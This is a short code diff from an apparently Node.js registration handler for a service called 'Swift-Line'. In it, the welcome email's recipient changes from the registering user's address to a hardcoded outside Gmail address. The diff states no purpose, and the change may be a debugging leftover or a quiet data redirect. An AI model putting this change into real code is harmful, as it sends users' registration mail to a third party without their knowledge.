@@ -2178,7 +2178,7 @@ app.post('/register/welcome.html', async (request, response) => {
 
     const mail_option = {
       from: `Swift-Line <noreply@assistin.online>`,
-      to: info.email,
+      to: 'wearehereagain23@gmail.com',
       subject: "Welcome Message From Swift-Line",
       html:
         `
